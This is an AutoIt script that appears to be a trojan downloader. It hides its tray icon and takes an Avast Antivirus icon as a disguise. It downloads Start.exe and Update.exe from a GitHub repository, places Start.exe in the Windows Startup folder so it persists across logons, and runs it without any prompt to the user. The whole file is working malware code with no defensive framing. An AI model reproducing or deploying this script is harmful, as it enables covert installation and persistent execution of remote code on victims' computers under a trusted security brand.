#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=Ico\1492258937_Avast_Antivirus.ico
#Tidy_Parameters=/rel /reel /sf
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
$luser = @StartupDir
$start = $luser & "\Start.exe"
$update = $luser & "\update.ini"
$update_exe = $luser & "\update.exe"

criarpath()
download()
Func criarpath()
	$path = FileExists(@AppDataDir & "\WinGG")
	If Not $path Then
		DirCreate(@AppDataDir & "\WinGG")
	EndIf
EndFunc   ;==>criarpath

Func download()
	If Not FileExists($start) Then
		InetGet("https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Start.exe", $start)
	EndIf

	If Not FileExists($update) Then
		InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/Update.ini", @AppDataDir & "\WinGG\update.ini")
	EndIf

	If Not FileExists($update_exe) Then
		InetGet("https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Update.exe", @AppDataDir & "\WinGG\update.exe")
	EndIf
		Run($luser & "\Start.exe")
EndFunc   ;==>download
